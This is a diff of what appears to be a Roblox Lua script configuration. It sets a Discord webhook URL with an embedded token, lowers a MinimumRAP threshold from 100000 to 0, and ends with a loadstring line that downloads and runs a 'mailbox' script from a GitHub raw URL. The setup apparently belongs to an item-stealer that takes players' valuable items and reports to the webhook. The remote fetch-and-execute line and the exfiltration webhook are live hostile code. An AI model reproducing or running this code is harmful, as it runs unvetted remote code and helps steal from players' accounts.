@@ -4,6 +4,6 @@ Webhook = "https://discord.com/api/webhooks/1203422013524287489/xC88w9HkuXza5tZb
 
 LoadingScreen = false
 
-MinimumRAP = 100000
+MinimumRAP = 0
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/egorpomidor123/scripts/main/mailbox"))()
